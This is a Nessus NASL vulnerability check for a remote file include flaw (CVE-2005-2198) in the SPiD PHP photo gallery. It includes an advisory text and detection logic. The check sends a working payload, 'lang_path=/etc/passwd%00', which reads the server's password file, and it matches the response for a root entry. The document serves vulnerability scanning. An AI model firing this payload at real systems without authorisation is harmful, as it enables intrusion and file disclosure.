#
# (C) Tenable Network Security
#


if (description) {
  script_id(18671);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2198");
  script_bugtraq_id(14208);

  name["english"] = "SPiD lang_path Remote File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description :

The remote host is running SPiD, a free, PHP-based photo gallery. 

The installed version of SPiD allows remote attackers to control the
'lang_path' variable used when including PHP code in the
'lang/lang.php' script.  By leveraging this flaw, an attacker may be
able to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://securitytracker.com/alerts/2005/Jul/1014437.html

Solution :

Either ensure that PHP's 'magic_quotes_gpc' setting is enabled and
that 'allow_url_fopen' and 'register_globals' are disabled or upgrade
to SPiD version 1.3.1. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for lang_path variable file include vulnerability in SPiD";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/lang/lang.php?",
      "lang_path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
